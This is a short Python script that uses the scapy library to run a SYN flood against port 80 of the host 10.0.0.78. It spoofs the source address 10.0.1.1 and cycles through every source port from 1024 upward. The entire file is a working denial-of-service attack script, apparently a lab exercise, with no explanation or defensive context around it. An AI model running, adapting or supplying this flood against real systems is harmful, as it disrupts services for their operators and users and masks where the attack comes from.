from scapy.all import *
def synFlood(src, tgt):
	for sport in range(1024, 65535):
		IPlayer = IP(src = src, dst=tgt)
		TCPlayer = TCP(sport=sport, dport=80)
		pkt = IPlayer / TCPlayer
		send(pkt)
src = "10.0.1.1"
tgt = "10.0.0.78"
synFlood(src,tgt)